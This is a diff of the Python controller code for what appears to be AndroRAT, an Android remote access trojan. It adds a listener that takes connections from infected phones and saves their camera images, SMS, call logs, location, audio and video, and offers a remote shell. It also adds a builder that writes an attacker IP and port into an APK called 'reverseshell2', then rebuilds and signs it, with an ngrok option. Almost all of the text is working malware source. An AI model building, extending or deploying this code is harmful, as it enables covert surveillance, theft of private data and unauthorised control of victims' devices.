@@ -9,6 +9,41 @@ import platform
 import re
 from subprocess import PIPE, run
 from colorama import Fore, Style,init
+from pyngrok import ngrok
+import socket
+import threading
+import itertools
+import queue
+
+
+banner = """\033[1m\033[91m
+                    _           _____         _______
+    /\             | |         |  __ \     /\|__   __|
+   /  \   _ __   __| |_ __ ___ | |__) |   /  \  | |   
+  / /\ \ | '_ \ / _` | '__/ _ \|  _  /   / /\ \ | |   
+ / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |   
+/_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|
+
+                                       \033[93m- By karma9874
+"""
+
+pattern = '\"(\\d+\\.\\d+).*\"'
+
+def stdOutput(type_=None):
+    if type_=="error":col="31m";str="ERROR"
+    if type_=="warning":col="33m";str="WARNING"
+    if type_=="success":col="32m";str="SUCCESS"
+    if type_ == "info":return "\033[1m[\033[33m\033[0m\033[1m\033[33mINFO\033[0m\033[1m] "
+    message = "\033[1m[\033[31m\033[0m\033[1m\033["+col+str+"\033[0m\033[1m]\033[0m "
+    return message
+
+
+def animate(message):
+    chars = "/—\\|"
+    for char in chars:
+        sys.stdout.write("\r"+stdOutput("info")+"\033[1m"+message+"\033[31m"+char+"\033[0m")
+        time.sleep(.1)
+        sys.stdout.flush()
 
 def clearDirec():
     if(platform.system() == 'Windows'):
@@ -32,8 +67,12 @@ def is_valid_port(port):
     i = 1 if port.isdigit() and len(port)>1  else  0
     return i
 
-def executeCMD(command):
+def execute(command):
+    return run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
+
+def executeCMD(command,queue):
     result = run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
+    queue.put(result)
     return result
 
 
@@ -65,29 +104,28 @@ def help():
     print(helper)
 
 def getImage(client):
-    print(Style.BRIGHT+Fore.YELLOW+"Taking Image"+Fore.RESET)
+    print(stdOutput("info")+"\033[0mTaking Image")
     timestr = time.strftime("%Y%m%d-%H%M%S")
     flag=0
     filename ="Dumps"+direc+"Image_"+timestr+'.jpg'
     imageBuffer=recvall(client) 
     imageBuffer = imageBuffer.strip().replace("END123","").strip()
     if imageBuffer=="":
-        print(Style.BRIGHT+Fore.RED+"Unable to Connect to Camera\n"+Fore.RESET)
+        print(stdOutput("error")+"Unable to connect to the Camera\n")
         return
     with open(filename,'wb') as img:    
         try:
             imgdata = base64.b64decode(imageBuffer)
             img.write(imgdata)
-            print(Style.BRIGHT+Fore.GREEN+"Succesfully Saved in "+getpwd(filename)+"\n"+Fore.RESET)
+            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\n")
         except binascii.Error as e:
             flag=1
-            print(e)
-            print(Style.BRIGHT+Fore.RED+"Not able to decode the Image\n"+Fore.RESET)
+            print(stdOutput("error")+"Not able to decode the Image\n")
     if flag == 1:
         os.remove(filename)
 
 def readSMS(client,data):
-    print(Style.BRIGHT+Fore.YELLOW+"Getting "+data+" SMS"+Fore.RESET)
+    print(stdOutput("info")+"\033[0mGetting "+data+" SMS")
     msg = "start"
     timestr = time.strftime("%Y%m%d-%H%M%S")
     filename = "Dumps"+direc+data+"_"+timestr+'.txt'
@@ -96,10 +134,10 @@ def readSMS(client,data):
         msg = recvall(client)
         try:
             txt.write(msg)
-            print(Style.BRIGHT+Fore.GREEN+"Succesfully Saved in "+getpwd(filename)+"\n"+Fore.RESET)
+            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\n")
         except UnicodeDecodeError:
             flag = 1
-            print(Style.BRIGHT+Fore.RED+"Not able to decode the SMS\n"+Fore.RESET)
+            print(stdOutput("error")+"Unable to decode the SMS\n")
     if flag == 1:
     	os.remove(filename)
 
@@ -110,10 +148,10 @@ def getFile(filename,ext,data):
         try:
             rawFile = base64.b64decode(data)
             file.write(rawFile)
-            print(Style.BRIGHT+Fore.GREEN+"Succesfully Downloaded in "+getpwd(fileData)+Fore.RESET)
+            print(stdOutput("success")+"Succesfully Downloaded in \033[1m\033[32m"+getpwd(fileData)+"\n")
         except binascii.Error:
             flag=1
-            print(Style.BRIGHT+Fore.RED+"Not able to decode the Audio File"+Fore.RESET)
+            print(stdOutput("error")+"Not able to decode the Audio File")
     if flag == 1:
         os.remove(filename)
 
@@ -144,18 +182,18 @@ def shell(client):
                 filedata = filename.split(".")
                 sendingData+="putFile"+"<"+filedata[0]+"<"+filedata[1]+"<"+encoded_data+"END123\n"
                 client.send(sendingData.encode("UTF-8"))
-                print(Style.BRIGHT+Fore.GREEN+f"Succesfully Uploaded the file {filedata[0]+'.'+filedata[1]} in /sdcard/temp/"+Fore.RESET)
+                print(stdOutput("success")+f"Succesfully Uploaded the file \033[32m{filedata[0]+'.'+filedata[1]} in /sdcard/temp/")
             else:
-                print (Style.BRIGHT+Fore.RED+"File not exist"+Fore.RESET)
+                print(stdOutput("error")+"File not exist")
 
         if "Exiting" in msg:
-            print(Style.BRIGHT+Fore.YELLOW+"----------Exiting Shell----------\n"+Fore.RESET)
+            print("\033[1m\033[33m----------Exiting Shell----------\n")
             return
         msg = msg.split("\n")
         for i in msg[:-2]:
             print(i)   
         print(" ")
-        command = input(Style.BRIGHT+Fore.CYAN+"android@shell:~$ "+Fore.RESET)
+        command = input("\033[1m\033[36mandroid@shell:~$\033[0m \033[1m")
         command = command+"\n"
         if command.strip() == "clear":
             client.send("test\n".encode("UTF-8"))
@@ -197,7 +235,7 @@ def recvallShell(sock):
     return buff
 
 def stopAudio(client):
-    print(Style.BRIGHT+Fore.YELLOW+"Downloading Audio"+Fore.RESET)
+    print(stdOutput("info")+"\033[0mDownloading Audio")
     timestr = time.strftime("%Y%m%d-%H%M%S")
     data= ""
     flag =0
@@ -208,17 +246,17 @@ def stopAudio(client):
         try:
             audioData = base64.b64decode(data)
             audio.write(audioData)
-            print(Style.BRIGHT+Fore.GREEN+"Succesfully Saved in "+getpwd(filename)+Fore.RESET)
+            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename))
         except binascii.Error:
             flag=1
-            print(Style.BRIGHT+Fore.RED+"Not able to decode the Audio File"+Fore.RESET)
+            print(stdOutput("error")+"Not able to decode the Audio File")
     print(" ")
     if flag == 1:
         os.remove(filename)
 
 
 def stopVideo(client):
-    print(Style.BRIGHT+Fore.YELLOW+"Downloading Video"+Fore.RESET)
+    print(stdOutput("info")+"\033[0mDownloading Video")
     timestr = time.strftime("%Y%m%d-%H%M%S")
     data= ""
     flag=0
@@ -229,15 +267,15 @@ def stopVideo(client):
         try:
             videoData = base64.b64decode(data)
             video.write(videoData)
-            print(Style.BRIGHT+Fore.GREEN+"Succesfully Saved in "+getpwd(filename)+"\n"+Fore.RESET)
+            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename))
         except binascii.Error:
             flag = 1
-            print(Style.BRIGHT+Fore.RED+"Not able to decode the Video File\n"+Fore.RESET)
+            print(stdOutput("error")+"Not able to decode the Video File\n")
     if flag == 1:
         os.remove("Video_"+timestr+'.mp4')
 
 def callLogs(client):
-    print(Style.BRIGHT+Fore.YELLOW+"Getting Call Logs"+Fore.RESET)
+    print(stdOutput("info")+"\033[0mGetting Call Logs")
     msg = "start"
     timestr = time.strftime("%Y%m%d-%H%M%S")
     msg = recvall(client)
@@ -250,6 +288,111 @@ def callLogs(client):
     	with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
     		txt.write(msg)
     		txt.close()
-    		print(Style.BRIGHT+Fore.GREEN+"Succesfully Saved in "+getpwd(filename)+"\n"+Fore.RESET)
+    		print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\033[0m")
     		if not os.path.getsize(filename):
     			os.remove(filename)
+
+def get_shell(ip,port):
+    soc = socket.socket() 
+    soc = socket.socket(type=socket.SOCK_STREAM)
+    try:
+        soc.bind((ip, int(port)))
+    except Exception as e:
+        print(stdOutput("error")+"\033[1m %s"%e);exit()
+
+    soc.listen(2)
+    print(banner)
+    while True:
+        que = queue.Queue()
+        t = threading.Thread(target=connection_checker,args=[soc,que])
+        t.daemon = True
+        t.start()
+        while t.isAlive(): animate("Waiting for Connections  ")
+        t.join()
+        conn, addr = que.get()
+        clear()
+        print("\033[1m\033[33mGot connection from \033[31m"+"".join(str(addr))+"\033[0m")
+        print(" ")
+        while True:
+            msg = conn.recv(4024).decode("UTF-8")
+            if(msg.strip() == "IMAGE"):
+                getImage(conn)
+            elif("readSMS" in msg.strip()):
+                content = msg.strip().split(" ")
+                data = content[1]
+                readSMS(conn,data)
+            elif(msg.strip() == "SHELL"):
+                shell(conn)
+            elif(msg.strip() == "getLocation"):
+                getLocation(conn)
+            elif(msg.strip() == "stopVideo123"):
+                stopVideo(conn)
+            elif(msg.strip() == "stopAudio"):
+                stopAudio(conn)
+            elif(msg.strip() == "callLogs"):
+                callLogs(conn)
+            elif(msg.strip() == "help"):
+                help()
+            else:
+                print(stdOutput("error")+msg) if "Unknown Command" in msg else print("\033[1m"+msg) if "Hello there" in msg else print(msg)
+            message_to_send = input("\033[1m\033[36mInterpreter:/> \033[0m")+"\n"
+            conn.send(message_to_send.encode("UTF-8"))
+            if message_to_send.strip() == "exit":
+                print(" ")
+                print("\033[1m\033[32m\t (∗ ･‿･)ﾉ゛\033[0m")
+                sys.exit()
+            if(message_to_send.strip() == "clear"):clear()
+
+
+def connection_checker(socket,queue):
+    conn, addr = socket.accept()
+    queue.put([conn,addr])
+    return conn,addr
+
+
+def build(ip,port,output,ngrok=False,ng=None):
+    editor = "Compiled_apk_files"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
+    try:
+        file = open(editor,"r").readlines()
+        #Very much uncertaninity but cant think any other way to do it xD
+        file[16]=file[16][:21]+"\""+ip+"\""+"\n"
+        file[21]=file[21][:21]+"\""+port+"\""+"\n"
+        str_file="".join([str(elem) for elem in file])
+        open(editor,"w").write(str_file)
+    except Exception as e:
+        print(e)
+        sys.exit()
+    java_version = execute("java -version")
+    version_no = re.search(pattern, java_version.stderr).groups()[0]
+    if java_version.stderr == "":print(stdOutput("error")+"Java Not Installed");exit()
+    if float(version_no) < 1.8: print(stdOutput("error")+"Java 8 is required ");exit()
+    print(stdOutput("info")+"\033[0mGenerating APK")
+    outFileName = output if output else "karma.apk"
+    que = queue.Queue()
+    t = threading.Thread(target=executeCMD,args=["java -jar Jar_Files/apktool.jar b Compiled_apk_files  -o "+outFileName,que],)
+    t.start()
+    while t.isAlive(): animate("Building APK ")
+    t.join()
+    print(" ")
+    resOut = que.get()
+    if not resOut.returncode:
+        print(stdOutput("success")+"Successfully apk built in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
+        print(stdOutput("info")+"\033[0mSigning the apk")
+        t = threading.Thread(target=executeCMD,args=["java -jar Jar_Files/sign.jar "+outFileName+" --override",que],)
+        t.start()
+        while t.isAlive(): animate("Signing Apk ")
+        t.join()
+        print(" ")
+        resOut = que.get()
+        if not resOut.returncode:
+            print(stdOutput("success")+"Successfully signed the apk \033[1m\033[32m"+outFileName+"\033[0m")
+            if ngrok:
+                clear()
+                get_shell("0.0.0.0",8000) if not ng else get_shell("0.0.0.0",ng)
+            print(" ")
+        else:
+            print("\r"+resOut.stderr)
+            print(stdOutput("error")+"Signing Failed")
+    else:
+        print("\r"+resOut.stderr)
+        print(stdOutput("error")+"Building Failed")
